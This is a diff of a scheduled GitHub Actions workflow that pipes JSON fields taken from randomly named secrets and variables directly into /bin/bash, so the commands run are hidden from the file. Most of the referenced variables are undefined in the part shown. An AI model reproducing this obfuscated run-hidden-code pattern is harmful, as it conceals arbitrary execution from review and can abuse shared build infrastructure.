@@ -3,28 +3,19 @@ name: shwenzheng
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
-
-jobs:  # 8242
+    - cron: '21 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shwenzheng
         env:
-          vlebj74512: ${{ secrets.vlebj74512 }}
+          po74196: ${{ secrets.po74196 }}
         run: |
-          echo $vlebj74512 | jq -r .b42 | /bin/bash
-          echo $ah9 | jq -r .kgiv494 | /bin/bash
-          echo $wky3384 | jq -r .e89 | /bin/bash
-          echo $o178 | jq -r .w4 | /bin/bash
-          echo $hpx606 | jq -r .fn97 | /bin/bash
-          echo $fhv97 | jq -r .tzz82 | /bin/bash
-          echo $tx79096 | jq -r .lz3 | /bin/bash
-          echo $vwl1849 | jq -r .oi08 | /bin/bash
-          echo $vdv328 | jq -r .lw535 | /bin/bash
-          echo $hvuee5 | jq -r .wmdg2 | /bin/bash
-          echo $ia317 | jq -r .o80 | /bin/bash
-          echo $bej79144 | jq -r .ic928 | /bin/bash
+          echo $po74196 | jq -r .aomsp55492 | /bin/bash
+          echo $btwq6 | jq -r .qjr98 | /bin/bash
+          echo $cqz05127 | jq -r .ix512 | /bin/bash
+          echo $qsi167 | jq -r .zac221 | /bin/bash
+          echo $xxhx9 | jq -r .wpmj76 | /bin/bash
 
